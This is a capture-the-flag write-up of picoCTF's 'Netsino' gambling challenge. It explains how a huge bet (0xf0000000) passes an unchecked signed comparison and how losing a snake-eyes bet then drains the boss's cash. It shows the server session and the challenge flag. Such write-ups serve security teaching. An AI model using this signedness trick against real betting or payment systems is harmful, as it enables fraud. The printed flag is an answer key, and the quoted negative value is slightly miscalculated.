### Solved by barrebas

Netsino is a 120 point challenge. 

`
Daedalus seems to have ties to a shady online gambling boss. Maybe if 
you beat him at his own game, you can persuade him to share some useful 
info. The server is running on vuln2014.picoctf.com:4547 and the source 
code can be found here.
`

We are presented with an online gambling program. You randomly get some cash and have to gamble against the boss. The following code takes your betsize:
 
```c
long getbet() {
    while(1) {
        printf("You've got $%lu. How much you wanna bet on this next toss?\n", player_cash);
        long bet = getnum(); 
        if(bet <= player_cash) {
            return bet;
        } else {
            puts("Yerr can't bet more than ya got!");
        }
    }
}
```
The object is to win all the boss' money, so he'll give you the flag. Unfortunately, the program is coded pretty securely. Furthermore, the odds of winning aren't favorable. Luckily for us, the program makes a mistake when reading in the betsize. If we supply a large enough value, then the number being read will be negative. The program does not check for this. So let's supply `0xf0000000`, which is 4026531840. For the c program, however, it will be a negative number. Thus, the betsize check will pass, because -268435445 is less than your total amount. Next, all we have to do is lose:

```c
void play(long choice, long bet, int x, int y) {
    switch(choice) {
		//...snip...
        case 5: if(x == 1 && y == 1) {
                player_cash += 36*bet;
                boss_cash -= 36*bet;
                puts(wins[rand()%3+7]);
            } else {
                puts(loses[rand()%3+7]);
            }
            break;
```

By betting on snake-eyes (a very slim chance of that happening), the program will subtract the betsize times 36 from our cash and add that same amount to the boss' money. However, we supplied a very large negative number for the betsize, meaning that we actually *get* money and the boss loses money. Rinse & repeat this a couple of times to get the flag:

```
bas@tritonal:~$ nc vuln2014.picoctf.com 4547
Arr, git ye into me casio, the hottest gamblin' sensation on the net!
Here, have a fiver, and let's gamble!
You've got $5. How much you wanna bet on this next toss?
> 4026531840
1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.
2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.
3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.
4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.
5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.
What'll it be?
> 5
Lets rock 'n' roll!
5 3
Snake eyes! ...not.
You've got $268435461. How much you wanna bet on this next toss?
> 4026531840
1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.
2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.
3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.
4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.
5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.
What'll it be?
> 5
Lets rock 'n' roll!
5 4
You seem to enjoy loosing.
You've got $536870917. How much you wanna bet on this next toss?
> 4026531840
1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.
2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.
3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.
4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.
5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.
What'll it be?
> 5
Lets rock 'n' roll!
2 1
Snake eyes! ...not.
You've got $805306373. How much you wanna bet on this next toss?
> 4026531840
1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.
2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.
3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.
4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.
5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.
What'll it be?
> 5
Lets rock 'n' roll!
4 3
Like that was ever gonna happen.
Great, I'm fresh outta cash. Take this flag instead.
i_wish_real_casinos_had_this_bug
Git outta here.
```
